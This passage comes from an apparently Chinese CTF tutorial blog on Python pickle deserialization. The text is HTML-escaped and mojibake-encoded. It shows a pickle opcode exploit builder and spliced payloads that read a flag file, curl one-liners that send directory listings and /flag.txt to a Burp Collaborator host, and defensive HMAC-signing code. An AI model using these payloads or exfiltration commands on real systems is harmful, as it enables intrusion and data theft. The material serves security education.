&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">payload_prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;(&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;X&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">struct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pack&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;I&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">)))&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload_suffix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;i__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">read&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">.&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload_prefix&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">payload_suffix&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;R&amp;#39;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Payload:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># b&amp;#39;(X\x04\x00\x00\x00flagi__main__\nread\n.&amp;#39;&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Length:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Base64:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811193545692.png" alt="image-20210811193545692">&lt;/p>
&lt;p>å†æŠŠè¿™ä¸€éƒ¨åˆ†çš„payloadç¼åˆåˆ°åˆ›å»ºAnimalå®žä¾‹çš„Opcodeä¸­åŽ»&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># åŽŸ: name=&amp;#39;x&amp;#39;,category=&amp;#39;y&amp;#39;&lt;/span>
&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">c__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Animal&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">)&lt;/span>&lt;span style="color:#8045ff">\x81&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x04\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">nameq&lt;/span>&lt;span style="color:#8045ff">\x03&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">xq&lt;/span>&lt;span style="color:#8045ff">\x04&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x08\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">categoryq&lt;/span>&lt;span style="color:#8045ff">\x05&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">yq&lt;/span>&lt;span style="color:#8045ff">\x06&lt;/span>&lt;span style="color:#d88200">ub.&amp;#39;&lt;/span>
&lt;span style="color:#75715e"># ç¼åˆ åº”è¯¥èƒ½çœ‹å‡ºæ¥æ”¹åœ¨å“ªé‡Œäº†&lt;/span>
&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">c__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Animal&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">)&lt;/span>&lt;span style="color:#8045ff">\x81&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x04\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">nameq&lt;/span>&lt;span style="color:#8045ff">\x03&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x04\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">flagi__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">read&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x04&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x08\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">categoryq&lt;/span>&lt;span style="color:#8045ff">\x05&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">yq&lt;/span>&lt;span style="color:#8045ff">\x06&lt;/span>&lt;span style="color:#d88200">ub.&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811195932427.png" alt="image-20210811195932427">&lt;/p>
&lt;h2 id="ä¸€äº›å°æŠ€å·§æ³¨æ„äº‹é¡¹">ä¸€äº›å°æŠ€å·§&amp;amp;æ³¨æ„äº‹é¡¹&lt;/h2>
&lt;ul>
&lt;li>å½“æŠŠpayloadä½œä¸ºgetå‚æ•°è¯·æ±‚æ—¶ï¼Œurlç¼–ç æ³¨æ„æ¢è¡Œç¬¦æ˜¯%0Aè€Œä¸æ˜¯%0D%0A&lt;/li>
&lt;li>å¯¹payloadè¿›è¡Œb64åŠ å¯†æ—¶ï¼Œæ³¨æ„åˆ«æŠŠ\nç»™å•ç‹¬ç¼–ç äº†ï¼ˆä¸è¿‡æ­£å¸¸éƒ½ä¸ä¼šï¼‰&lt;/li>
&lt;li>å…¶ä»–æ¨¡å—çš„loadä¹Ÿå¯ä»¥è§¦å‘pickleååºåˆ—åŒ–æ¼æ´ž&lt;/li>
&lt;/ul>
&lt;p>ä¾‹å¦‚ï¼š&lt;code>numpy.load()&lt;/code>å…ˆå°è¯•ä»¥numpyè‡ªå·±çš„æ•°æ®æ ¼å¼å¯¼å…¥ï¼Œå¦‚æžœå¤±è´¥ï¼Œåˆ™å°è¯•ä»¥pickleçš„æ ¼å¼å¯¼å…¥ï¼›&lt;code>pandas.read_pickle()&lt;/code>ç›´æŽ¥ä½¿ç”¨&lt;code>pickle.load()&lt;/code>æ–¹æ³•&lt;/p>
&lt;ul>
&lt;li>çµæ´»è¿ç”¨&lt;u>&lt;strong>burp collaborator&lt;/strong>&lt;/u>&lt;/li>
&lt;/ul>
&lt;p>è™½ç„¶æˆ‘ä»¬ä¸èƒ½æŠŠburpæä¾›çš„collaboratorå½“ä½œvpsæ¥ä½¿ç”¨ï¼Œè¿›è¡Œåå¼¹shellç„¶åŽä¸€é€šæ“ä½œï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨åå¼•å·+curlçš„æ–¹å¼ç›´æŽ¥èŽ·å¾—ä»£ç æ‰§è¡Œå’Œç»“æžœçš„è¾“å‡ºï¼›curlæœ¬èº«çš„ç”¨æ³•ä¹Ÿå¾ˆå¤šï¼Œå¯ä»¥ç›´æŽ¥å¸¦æ–‡ä»¶è¿›è¡Œpostï¼Œæ›´å¤šå†…å®¹å‚è§ï¼š&lt;a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl çš„ç”¨æ³•æŒ‡å—&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># åŸºæ“1&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;curl http://xxxx.burpcollaborator.net/`ls / | base64`)&lt;/span>
&lt;span style="color:#75715e"># åŸºæ“2 -då‚æ•°å¯ä»¥è¯»å–æœ¬åœ°æ–‡ä»¶å†…å®¹ä½œä¸ºæ•°æ®ä½“å‘é€ï¼Œä¼šè‡ªåŠ¨æ·»åŠ è¯·æ±‚å¤´å¹¶è°ƒæ•´è¯·æ±‚æ–¹æ³• æ— éœ€-X POST&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;curl -d &amp;#39;&lt;/span>&lt;span style="color:#f92672">@/&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">txt&lt;/span>&lt;span style="color:#d88200">&amp;#39; http://xxxx.burpcollaborator.net/)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="æœ€åŽå‡ºäºŽå®‰å…¨è§’åº¦çš„è€ƒé‡">æœ€åŽï¼Œå‡ºäºŽå®‰å…¨è§’åº¦çš„è€ƒé‡&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>ç¦ç”¨pickleï¼Œä½¿ç”¨Jsonæˆ–Google Protocol Buffers&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å½“ç¡®å®žéœ€è¦ä½¿ç”¨pickleæ—¶ï¼Œè¦ç¡®ä¿å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œæ¯”å¦‚é‡å†™&lt;code>find_class()&lt;/code>ï¼ˆä½¿ç”¨ç™½åå•è€Œä¸æ˜¯é»‘åå•è¿›è¡Œè¿‡æ»¤ï¼‰ã€ç¦æ­¢æŸäº›æ“ä½œç¬¦ï¼›ç”±äºŽåœ¨å¯¹opcodeè¿›è¡Œååºåˆ—åŒ–æ—¶å¯èƒ½ä¼šé€ æˆä»»æ„æ–‡ä»¶è¯»å†™ï¼Œä¸€å®šæå‰å¯¹é‡è¦æ–‡ä»¶åšå¥½æƒé™çš„ç®¡ç†ï¼›å¿…è¦æ—¶å¯ä»¥å¯¹ä¿¡æ¯è¿›è¡Œhmacç­¾å&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä¸¾ä¸€ä¸ªhmacçš„æ —å­&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">hmac&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">age&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">age&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__str__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;My name is &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">, I am &lt;/span>&lt;span style="color:#d88200">%d&lt;/span>&lt;span style="color:#d88200"> years old.&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">age&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HMAC_Pickler&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">secret_key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">seperator&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;|&amp;#34;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">secret_key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">secret_key&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">seperator&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">seperator&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">digital_signature&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">signer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">hmac&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">new&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">secret_key&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">signer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">update&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">signer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">hexdigest&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">sign&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">[:&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">seperator&lt;/span>&lt;span style="color:#111">):]&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">sign&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digital_signature&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Data is tampered by someone.&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">sign&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digital_signature&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">%s%s%s&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sign&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">seperator&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">SECRET_KEY&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;7f54a0ab-6443-457c-ba20-2510ebbfb28f&amp;#39;&lt;/span>
&lt;span style="color:#111">pickler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HMAC_Pickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Jack&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">19&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">&amp;#34;I am hacker, trying evil things&amp;#34;&lt;/span>
&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­9 - [BalsnCTF 2019] Pyshv3
&lt;/h4>
&lt;/summary>
&lt;p>è¿™æ¬¡çš„find_class()æ²¡æœ‰å˜åŒ–ï¼Œä½†æ˜¯structsæœ‰å…·ä½“çš„å®žçŽ°&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210812012841569.png" alt="image-20210812012841569">&lt;/p>
&lt;p>åŒæ—¶server.pyçš„é€»è¾‘ä¹Ÿå‘ç”Ÿäº†å˜åŒ–ï¼Œä¸ç”¨rceäº†ï¼Œç›´æŽ¥æœ‰ä¸€ä¸ªæ‹¿flagçš„å‡½æ•°ï¼Œä½†éœ€è¦self.user.privilegedä¸ºTrueæ‰å¯ä»¥è¿”å›ž&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210812013032487.png" alt="image-20210812013032487">&lt;/p>
&lt;p>è€Œè¿™ä¸ªself.user.privilegedåœ¨ä¸€å¼€å§‹å°±è¢«è®¾ä¸ºäº†False&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210812013115089.png" alt="image-20210812013115089">&lt;/p>
&lt;p>emmmm è¿™æ€Žä¹ˆç»•è¿‡æï¼Ÿ&lt;/p>
&lt;p>å…ˆè¯´éžé¢„æœŸï¼Œå°†&lt;code>__builtins__&lt;/code>å¤åˆ¶åˆ°moduleså±žæ€§ä¸Šï¼›å†è¯´è¯´é¢„æœŸè§£ã€‚&lt;/p>
